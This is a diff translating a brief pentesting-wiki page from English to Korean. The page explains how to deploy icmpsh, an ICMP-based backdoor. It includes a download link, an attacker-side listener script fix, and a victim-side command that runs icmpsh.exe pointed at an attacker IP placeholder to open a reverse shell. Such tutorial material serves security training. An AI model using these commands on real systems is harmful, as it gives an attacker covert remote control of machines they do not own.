@@ -1,31 +1,25 @@
 {{#include ../banners/hacktricks-training.md}}
 
-Download the backdoor from: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)
+백도어를 다운로드하려면: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)
 
-# Client side
+# 클라이언트 측
 
-Execute the script: **run.sh**
+스크립트를 실행하세요: **run.sh**
 
-**If you get some error, try to change the lines:**
-
+**오류가 발생하면 다음 줄을 변경해 보세요:**
 ```bash
 IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
 IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
 ```
-
-**For:**
-
+**대상:**
 ```bash
 echo Please insert the IP where you want to listen
 read IP
 ```
+# **피해자 측**
 
-# **Victim Side**
-
-Upload **icmpsh.exe** to the victim and execute:
-
+**icmpsh.exe**를 피해자에게 업로드하고 실행합니다:
 ```bash
 icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
 ```
-
 {{#include ../banners/hacktricks-training.md}}
